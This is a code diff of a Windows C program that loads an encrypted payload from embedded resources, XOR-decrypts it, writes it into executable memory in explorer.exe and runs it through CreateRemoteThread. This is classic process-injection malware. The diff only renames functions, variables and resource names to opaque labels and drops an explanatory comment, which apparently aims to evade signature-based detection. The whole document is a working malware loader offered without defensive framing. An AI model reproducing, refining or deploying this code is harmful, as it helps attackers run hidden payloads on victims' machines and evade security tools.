@@ -5,7 +5,7 @@
 #pragma comment (lib, "user32.lib")
 #include <tlhelp32.h>
 
-void LoadResourceData(const char* resName, char** data, DWORD* size) {
+void LDDATA(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
 
@@ -20,9 +20,9 @@ void LoadResourceData(const char* resName, char** data, DWORD* size) {
 
 
 
-void DecryptXOR(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
-    for (DWORD i = 0; i < codeLen; i++) {
-        code[i] ^= key[i % keyLen]; 
+void XODEC(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
+    for (DWORD da = 0; da < codeLen; da++) {
+        code[da] ^= key[da % keyLen]; 
     }
 }
 
@@ -32,11 +32,11 @@ int main() {
     
     char* AESkey;
     DWORD AESkeyLen;
-    LoadResourceData("AESKEY", &AESkey, &AESkeyLen);
+    LDDATA("coolkey", &AESkey, &AESkeyLen);
 
     char* AESCode;
     DWORD AESCodeLen;
-    LoadResourceData("AESCODE", &AESCode, &AESCodeLen);
+    LDDATA("coolcode", &AESCode, &AESCodeLen);
     
     
     PROCESSENTRY32 pe32;
@@ -51,18 +51,18 @@ int main() {
        if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               
-              LPVOID memalo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-              DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
+              LPVOID CAMLO = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+              
+              XODEC(AESCode, AESCodeLen, AESkey , AESkeyLen);
              
-              WriteProcessMemory(hProcess, memalo, AESCode, AESCodeLen, NULL);
+              WriteProcessMemory(hProcess, CAMLO, AESCode, AESCodeLen, NULL);
              
              
 
-             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
+             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)CAMLO, NULL, 0, NULL);
              WaitForSingleObject(tHandle, INFINITE);
              
-              VirtualFreeEx(hProcess, memalo, 0, MEM_RELEASE);
+              VirtualFreeEx(hProcess, CAMLO, 0, MEM_RELEASE);
            
               CloseHandle(tHandle);
            
